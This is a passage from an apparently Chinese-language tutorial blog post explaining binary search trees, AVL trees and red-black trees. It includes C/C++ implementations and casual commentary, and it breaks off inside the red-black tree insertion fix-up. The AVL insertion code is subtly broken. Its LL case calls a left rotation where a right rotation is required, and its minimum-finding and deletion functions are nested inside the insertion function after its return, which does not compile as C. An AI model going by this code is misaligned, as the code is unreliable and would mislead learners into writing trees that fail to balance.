class="hljs-comment">//定义</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">left</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">right</span>;</span><br>&#125; TreeNode;<br><br><span class="hljs-comment">//插入</span><br>TreeNode* <span class="hljs-title function_">insert</span><span class="hljs-params">(TreeNode* t, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">NULL</span>) &#123;<br>        TreeNode* newNode = (TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TreeNode));<br>        newNode-&gt;data = val;<br>        newNode-&gt;left = <span class="hljs-literal">NULL</span>;<br>        newNode-&gt;right = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span> newNode;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (val &lt; t-&gt;data) &#123;<br>        t-&gt;left = insert(t-&gt;left, val);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val &gt; t-&gt;data) &#123;<br>        t-&gt;right = insert(t-&gt;right, val);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br><br><span class="hljs-comment">//搜索</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">search</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (root-&gt;data == key) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;data &lt; key) &#123;<br>        <span class="hljs-keyword">return</span> search(root-&gt;right, key);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> search(root-&gt;left, key);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//删除(3种情况)</span><br>TreeNode* <span class="hljs-title function_">findMin</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>    <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(node-&gt;left != <span class="hljs-literal">NULL</span>)&#123;<br>        node = node-&gt;left;<br>    &#125;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br>TreeNode* <span class="hljs-title function_">removeNode</span><span class="hljs-params">(TreeNode* root,<span class="hljs-type">int</span> val)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(root-&gt;data &lt; val)&#123;<br>        root-&gt;right = removeNode(root-&gt;right,val);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;data &gt; val)&#123;<br>        root-&gt;left = removeNode(root-&gt;left,val);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-built_in">free</span>(root);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span>)&#123;<br>            TreeNode* temp = root-&gt;right;<br>            <span class="hljs-built_in">free</span>(root);<br>            <span class="hljs-keyword">return</span> temp;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>            TreeNode* temp = root-&gt;left;<br>            <span class="hljs-built_in">free</span>(root);<br>            <span class="hljs-keyword">return</span> temp;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            TreeNode* minNode = findMin(root-&gt;right);<br>            root-&gt;data = minNode-&gt;data;<br>            root-&gt;right = removeNode(root-&gt;right,minNode-&gt;data);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到BST的实现中存在一些问题</p><p>比如依次插入1,2,3,4,5</p><p>形成一个每个节点只有右子树的树</p><p>那和链表有什么区别!</p><p>因此引入了<code>平衡二叉树</code></p><p>即控制树的高度以保证其各类操作的高效性</p><p>先来看看<strong>AVL树</strong>吧</p><p>其定义为</p><p>对于任意一个节点，其左子树和右子树的高度差(<strong>平衡因子</strong>)的绝对值不超过<code>1</code>，一旦某次插入或删除操作破坏了这一约束，树结构便会通过<code>旋转</code>(rotation)操作进行调整，以重新恢复平衡</p><p>旋转有左旋，右旋</p><p>其中又分为四种情况，LL,RR,LR,RL，依旧分类讨论+递归</p><p>来看看具体怎么实现吧</p><h2 id="平衡二叉树之AVL树"><a href="#平衡二叉树之AVL树" class="headerlink" title="平衡二叉树之AVL树"></a>平衡二叉树之AVL树</h2><p><code>旋转</code>…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//定义</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>&#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-type">int</span> height;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">left</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">right</span>;</span><br>&#125; TreeNode;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">height</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>    <span class="hljs-keyword">return</span> node == <span class="hljs-literal">NULL</span> ? <span class="hljs-number">0</span> : node-&gt;height;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">return</span> a &gt; b ? a : b;<br>&#125;<br><br><span class="hljs-comment">//创建新节点</span><br>TreeNode* <span class="hljs-title function_">newNode</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span>&#123;<br>    TreeNode* node = (TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TreeNode));<br>    node-&gt;data = val;<br>    node-&gt;left = <span class="hljs-literal">NULL</span>;<br>    node-&gt;right = <span class="hljs-literal">NULL</span>;<br>    node-&gt;height = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-comment">//右旋(LL)</span><br>TreeNode* <span class="hljs-title function_">rightRotate</span><span class="hljs-params">(TreeNode* y)</span>&#123;<br>    TreeNode* x = y-&gt;left;<br>    TreeNode* T2 = x-&gt;right;<br><br>    x-&gt;right = y;<br>    y-&gt;left = T2;<br><br>    y-&gt;height = max(height(y-&gt;left),height(y-&gt;right)) + <span class="hljs-number">1</span>;<br>    x-&gt;height = max(height(x-&gt;left),height(x-&gt;right)) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> x;<br>&#125;<br><br><span class="hljs-comment">//左旋(RR)</span><br>TreeNode* <span class="hljs-title function_">leftRotate</span><span class="hljs-params">(TreeNode* x)</span>&#123;<br>    TreeNode* y = x-&gt;right;<br>    TreeNode* T2 = y-&gt;left;<br><br>    y-&gt;left = x;<br>    x-&gt;right = T2;<br><br>    x-&gt;height = max(height(x-&gt;left),height(x-&gt;right)) + <span class="hljs-number">1</span>;<br>    y-&gt;height = max(height(y-&gt;left),height(y-&gt;right)) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> y;<br>&#125;<br><br><span class="hljs-comment">//平衡因子</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>    <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> height(node-&gt;left) - height(node-&gt;right);<br>&#125;<br><br><span class="hljs-comment">//AVL插入</span><br><br>TreeNode* <span class="hljs-title function_">insert</span><span class="hljs-params">(TreeNode* node,<span class="hljs-type">int</span> val)</span>&#123;<br>    <span class="hljs-comment">//普通BST插入</span><br>    <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> newNode(val);<br><br>    <span class="hljs-keyword">if</span>(val &lt; node-&gt;data)&#123;<br>        node-&gt;left = insert(node-&gt;left,val);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(val &gt; node-&gt;data)&#123;<br>        node-&gt;right = insert(node-&gt;right,val);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> node; <span class="hljs-comment">//AVL不插入重复值</span><br>    &#125;<br><br>    <span class="hljs-comment">//更新高度</span><br>    node-&gt;height = <span class="hljs-number">1</span> + max(height(node-&gt;left),height(node-&gt;right));<br><br>    <span class="hljs-comment">//计算平衡因子</span><br>    <span class="hljs-type">int</span> balance = getBalance(node);<br><br>    <span class="hljs-comment">//4种失衡情况</span><br><br>    <span class="hljs-comment">//LL</span><br>    <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; val &lt; node-&gt;left-&gt;data)&#123;<br>        <span class="hljs-keyword">return</span> leftRotate(node);<br>    &#125;<br>    <br>    <span class="hljs-comment">//RR</span><br>    <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; val &gt; node-&gt;right-&gt;data)&#123;<br>        <span class="hljs-keyword">return</span> leftRotate(node);<br>    &#125;<br><br>    <span class="hljs-comment">//LR</span><br>    <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; val &gt; node-&gt;left-&gt;data)&#123;<br>        node-&gt;left = leftRotate(node-&gt;left);<br>        <span class="hljs-keyword">return</span> rightRotate(node);<br>    &#125;<br><br>    <span class="hljs-comment">//RL</span><br>    <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; val &lt; node-&gt;right-&gt;data)&#123;<br>        node-&gt;right = rightRotate(node-&gt;right);<br>        <span class="hljs-keyword">return</span> leftRotate(node);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> node;<br><br>    <span class="hljs-comment">//查找最小节点</span><br>    TreeNode* <span class="hljs-title function_">findMin</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>        <span class="hljs-keyword">while</span>(node-&gt;left != <span class="hljs-literal">NULL</span>)&#123;<br>            node = node-&gt;left;<br>        &#125;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br><br>    <span class="hljs-comment">//AVL删除</span><br>    TreeNode* <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(TreeNode* root,<span class="hljs-type">int</span> key)</span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> root;<br>        &#125;<br><br>        <span class="hljs-comment">//BST删除</span><br>        <span class="hljs-keyword">if</span>(key &lt; root-&gt;data)&#123;<br>            root-&gt;left = deleteNode(root-&gt;left,key);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &gt; root-&gt;data)&#123;<br>            root-&gt;right = deleteNode(root-&gt;right,key);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span> || root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>                TreeNode* temp = root-&gt;left ? root-&gt;left : root-&gt;right;<br>                <span class="hljs-keyword">if</span>(temp == <span class="hljs-literal">NULL</span>)&#123;<br>                    temp = root;<br>                    root = <span class="hljs-literal">NULL</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    *root = *temp;<br>                &#125;<br>                <span class="hljs-built_in">free</span>(temp);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                TreeNode* temp = findMin(root-&gt;right);<br>                root-&gt;data = temp-&gt;data;<br>                root-&gt;right = deleteNode(root-&gt;right,temp-&gt;data);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> root;<br><br>        <span class="hljs-comment">//更新高度</span><br>        root-&gt;height = <span class="hljs-number">1</span> + max(height(root-&gt;left),height(root-&gt;right));<br><br>        <span class="hljs-comment">//调整平衡</span><br>        <span class="hljs-type">int</span> balance = getBalance(root);<br><br>        <span class="hljs-comment">//同理 4种失衡情况</span><br><br>        <span class="hljs-comment">//LL</span><br>        <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; getBalance(root-&gt;left) &gt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> rightRotate(root);<br>        &#125;<br><br>        <span class="hljs-comment">//RR</span><br>        <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; getBalance(root-&gt;right) &lt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> leftRotate(root);<br>        &#125;<br><br>        <span class="hljs-comment">//LR</span><br>        <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; getBalance(root-&gt;left) &lt; <span class="hljs-number">0</span>)&#123;<br>            root-&gt;left = leftRotate(root-&gt;left);<br>            <span class="hljs-keyword">return</span> rightRotate(root);<br>        &#125;<br><br>        <span class="hljs-comment">//RL</span><br>        <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; getBalance(root-&gt;right) &gt; <span class="hljs-number">0</span>)&#123;<br>            root-&gt;right = rightRotate(root-&gt;right);<br>            <span class="hljs-keyword">return</span> leftRotate(root);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>理解</strong>…</p><p>有点懵了?</p><p>没事儿</p><p>还有更难绷的</p><p>接下来登场的是</p><p><code>红黑树</code>!!!</p><h2 id="平衡二叉树之红黑树"><a href="#平衡二叉树之红黑树" class="headerlink" title="平衡二叉树之红黑树"></a>平衡二叉树之红黑树</h2><p>逆天…</p><p>可以看到，AVL树的平衡条件过于严格，导致维护成本过高</p><p>不是在旋转，就是在旋转的路上…</p><p>因此又引入了<strong>红黑树</strong></p><p>通过对节点标记为<code>红色</code>或<code>黑色</code>，并维护一组颜色规则，确保从任意节点到其后代叶子节点的路径上，黑色节点的数量保持一致，从而避免树结构发生严重退化</p><p>这种设计哲学在旋转次数,维护成本与查找效率之间，取得了一个极为实用的折中，因此在工程中十分讨喜</p><p>下面”简单”实现一下</p><p>旋转操作和AVL树倒是差不多</p><p>但是这个各种染色操作太逆天了</p><p>不过还是依照一定的逻辑来的</p><p>自己细品吧…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 定义</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Color</span> &#123;</span> RED, BLACK &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> key;<br>    Color color;<br>    Node *left, *right, *parent;<br><br>    Node(<span class="hljs-type">int</span> k)<br>        : key(k), color(RED), left(nullptr), right(nullptr), parent(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 红黑树结构 + 旋转</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RBTree</span> &#123;</span><br>private:<br>    Node* root;<br>    Node* NIL; <span class="hljs-comment">// 黑色哨兵虚拟节点 用来代替所有的 nullptr 叶子节点 永远是黑色的</span><br><br>    <span class="hljs-comment">// 左旋</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">leftRotate</span><span class="hljs-params">(Node* x)</span> &#123;<br>        Node* y = x-&gt;right;<br>        x-&gt;right = y-&gt;left;<br>        <span class="hljs-keyword">if</span> (y-&gt;left != NIL)<br>            y-&gt;left-&gt;parent = x;<br><br>        y-&gt;parent = x-&gt;parent;<br>        <span class="hljs-keyword">if</span> (x-&gt;parent == NIL)<br>            root = y;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (x == x-&gt;parent-&gt;left)<br>            x-&gt;parent-&gt;left = y;<br>        <span class="hljs-keyword">else</span><br>            x-&gt;parent-&gt;right = y;<br><br>        y-&gt;left = x;<br>        x-&gt;parent = y;<br>    &#125;<br><br>    <span class="hljs-comment">// 右旋</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">rightRotate</span><span class="hljs-params">(Node* y)</span> &#123;<br>        Node* x = y-&gt;left;<br>        y-&gt;left = x-&gt;right;<br>        <span class="hljs-keyword">if</span> (x-&gt;right != NIL)<br>            x-&gt;right-&gt;parent = y;<br><br>        x-&gt;parent = y-&gt;parent;<br>        <span class="hljs-keyword">if</span> (y-&gt;parent == NIL)<br>            root = x;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (y == y-&gt;parent-&gt;left)<br>            y-&gt;parent-&gt;left = x;<br>        <span class="hljs-keyword">else</span><br>            y-&gt;parent-&gt;right = x;<br><br>        x-&gt;right = y;<br>        y-&gt;parent = x;<br>    &#125;<br><br>    <span class="hljs-comment">// 插入 + 插入修复</span><br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">insertFix</span><span class="hljs-params">(Node* z)</span> &#123;<br>        <span class="hljs-keyword">while</span> (z-&gt;parent-&gt;color == RED) &#123;<br>            <span class="hljs-keyword">if</span> (z-&gt;parent == z-&gt;parent-&gt;parent-&gt;left) &#123;<br>                Node* y = z-&gt;parent-&gt;parent-&gt;right; <span class="hljs-comment">// 叔叔</span><br>                <span class="hljs-keyword">if</span> (y-&gt;color == RED) &#123;              <span class="hljs-comment">// Case 1 叔叔是红色</span><br>                    z-&gt;parent-&gt;color = BLACK;       <span class="hljs-comment">// 叔父爷变色</span><br>                    y-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    z = z-&gt;parent-&gt;parent; <span class="hljs-comment">// 爷爷变插入节点</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (z == z-&gt;parent-&gt;right) &#123; <span class="hljs-comment">// Case 2 LR</span><br>                        z = z-&gt;parent;<br>                        leftRotate(z);<br>                    &#125;<br>                    <span class="hljs-comment">// Case 3 LL</span><br>                    z-&gt;parent-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    rightRotate(z-&gt;parent-&gt;parent);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;                               <span class="hljs-comment">// 对称</span><br>                Node* y = z-&gt;parent-&gt;parent-&gt;left; <span class="hljs-comment">// 叔叔</span><br>                <span class="hljs-keyword">if</span> (y-&gt;color == RED) &#123;<br>                    z-&gt;parent-&gt;color = BLACK;<br>                    y-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    z = z-&gt;parent-&gt;parent;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (z == z-&gt;parent-&gt;left) &#123;<br>                        z = z-&gt;parent;<br>                        rightRotate(z); <span class="hljs-comment">// RL</span><br>                    &#125;<br>                    <span class="hljs-comment">// RR</span><br>                    z-&gt;parent-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    